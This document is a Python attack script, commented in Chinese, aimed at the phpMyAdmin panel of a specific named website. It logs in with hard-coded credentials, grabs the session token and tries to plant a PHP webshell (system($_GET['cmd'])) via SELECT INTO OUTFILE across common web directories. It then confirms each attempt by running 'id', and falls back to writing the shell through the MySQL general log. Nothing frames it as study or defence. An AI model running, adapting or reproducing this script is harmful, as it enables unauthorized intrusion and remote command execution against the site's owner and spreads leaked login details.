#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
print("[*] 登录phpMyAdmin...")
login_data = {
    "pma_username": "mysql",
    "pma_password": "Mu123.123.",
    "server": "1"
}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)

# 提取token
token_match = re.search(r'token=([a-f0-9]+)', resp.text)
if not token_match:
    print("[-] 未找到token")
    exit(1)
token = token_match.group(1)
print(f"[+] Token: {token}")

# 尝试常见web目录写入shell
web_paths = [
    "/var/www/html",
    "/var/www",
    "/usr/share/nginx/html",
    "/home/www",
    "/var/www/phpmyadmin",
    "/opt/lampp/htdocs",
    "/var/www/phpmyadmin/../../html",
    "/var/www/phpmyadmin/../html"
]

shell_content = '<?php system($_GET["cmd"]); ?>'
shell_name = "shell.php"

print("[*] 尝试写入webshell...")
for web_path in web_paths:
    for db in ["mysql", "information_schema", "portal"]:
        try:
            sql = f"SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '{web_path}/{shell_name}';"
            sql_data = {"sql_query": sql, "db": db}
            resp = session.post(url + "server_sql.php", params={"token": token, "db": db}, data=sql_data, timeout=10)
            
            # 验证shell是否写入成功
            test_url = f"https://olympic.su.ac.th/{shell_name}"
            test_resp = requests.get(test_url, params={"cmd": "id"}, verify=False, timeout=5)
            if "uid=" in test_resp.text or "gid=" in test_resp.text:
                print(f"[+] Shell写入成功: {test_url}")
                print(f"[+] 测试: {test_url}?cmd=id")
                exit(0)
        except Exception as e:
            continue

# 备选方案：使用日志文件
print("[*] 尝试日志文件写入...")
try:
    sql_log = [
        "SET GLOBAL general_log_file = '/var/www/html/shell.php';",
        "SET GLOBAL general_log = 'ON';",
        "SELECT '<?php system($_GET[\"cmd\"]); ?>';",
        "SET GLOBAL general_log = 'OFF';"
    ]
    for sql in sql_log:
        sql_data = {"sql_query": sql, "db": "mysql"}
        session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, timeout=5)
    
    test_url = "https://olympic.su.ac.th/shell.php"
    test_resp = requests.get(test_url, params={"cmd": "id"}, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell写入成功(日志): {test_url}")
        exit(0)
except:
    pass

print("[-] 继续尝试其他路径...")
